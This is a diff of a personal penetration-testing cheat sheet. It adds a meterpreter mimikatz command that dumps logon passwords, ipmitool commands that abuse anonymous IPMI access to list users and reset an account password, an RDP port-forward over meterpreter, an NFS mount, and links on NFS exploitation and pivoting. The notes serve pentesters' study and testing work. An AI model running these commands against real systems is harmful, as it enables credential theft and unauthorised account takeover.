@@ -1,5 +1,7 @@
 ﻿[![main-page](https://img.shields.io/badge/Back%20to%20the%20main%20page-snovvcrash.github.io-cc0000?style=social&logo=jekyll)](https://snovvcrash.github.io/)
 
+Use your <kbd>Ctrl<kbd>-<kbd>F<kbd> to navigate around in this mess :mag:
+
 [//]: # (# -- 5 spaces)
 [//]: # (## -- 4 spaces)
 [//]: # (### -- 3 spaces)
@@ -1687,6 +1689,7 @@ meterpreter > load kiwi
 meterpreter > creds_msv
 meterpreter > creds_all
 meterpreter > lsa_dump_secrets
+meterpreter > kiwi_cmd '"privilege::debug" "sekurlsa::logonpasswords full" "exit"'
 ```
 
 
@@ -3695,6 +3698,7 @@ QUIT
 # IPMI
 
 * [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
+* [https://habr.com/ru/company/selectel/blog/439834/](https://habr.com/ru/company/selectel/blog/439834/)
 
 
 
@@ -3743,6 +3747,23 @@ $ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user s
 $ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user set password <ID> 'Passw0rd!'
 $ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user priv <ID> 4
 $ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user enable <ID> 3
+```
+
+
+
+
+## Anonymous Authentication
+
+Can be discovered with MSF `ipmi_dumphashes` but also with ipmitool:
+
+```
+$ ipmitool -I lanplus -H 127.0.0.1 -U '' -P '' user list
+```
+
+Change password of a named user account:
+
+```
+$ ipmitool -I lanplus -H 127.0.0.1 -U '' -P '' user set password <ID> 'Passw0rd!'
 ```
 
 
@@ -4342,6 +4363,7 @@ Reverse local port `3389` (on Victim, `10.10.13.37`) to local port `43389` (on A
 
 ```
 meterpreter > portfwd add -l 43389 -p 3389 -r 10.10.13.37
+[*] Local TCP relay created: :43389 <-> 10.10.13.37:3389
 $ xfreerdp /u:administrator /p:'Passw0rd!' /v:127.0.0.1:43389
 ```
 
@@ -4420,6 +4442,10 @@ $ vi ~/.msf4/modules/exploits/linux/http/p.rb
 
 # NFS
 
+* [https://resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
+* [https://blog.christophetd.fr/write-up-vulnix/](https://blog.christophetd.fr/write-up-vulnix/)
+* [https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)
+
 
 
 
@@ -4442,12 +4468,9 @@ $ sudo nmap -sV --script 'nfs*' 10.10.10.0/24 -p111
 
 ## Mount
 
-* [https://resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
-* [https://blog.christophetd.fr/write-up-vulnix/](https://blog.christophetd.fr/write-up-vulnix/)
-
 ```
 $ showmount -e 10.10.13.37
-$ sudo mount -v -t nfs -o vers=3 -o nolock -o user=snovvcrash,[pass='Passw0rd!'] 10.10.13.37:/home /mnt/nfs
+$ sudo mount -v -t nfs -o vers=3 -o nolock -o user=snovvcrash,pass='Passw0rd!' 10.10.13.37:/home /mnt/nfs
 ```
 
 
@@ -4925,6 +4948,7 @@ Stager encryption is the same as for Ruler/Forms.
 
 * [PayloadsAllTheThings/Network Pivoting Techniques.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
 * [https://www.programmersought.com/article/93593867459/](https://www.programmersought.com/article/93593867459/)
+* [https://habr.com/ru/post/331348/#t2](https://habr.com/ru/post/331348/#t2)
 
 
 
@@ -7564,7 +7588,7 @@ $ sudo bash airgeddon.sh
 #### wifiphisher
 
 * [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)
-* [https://github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst](https://github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst)
+* [Creating a custom phishing scenario · wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst)
 
 Install:
 
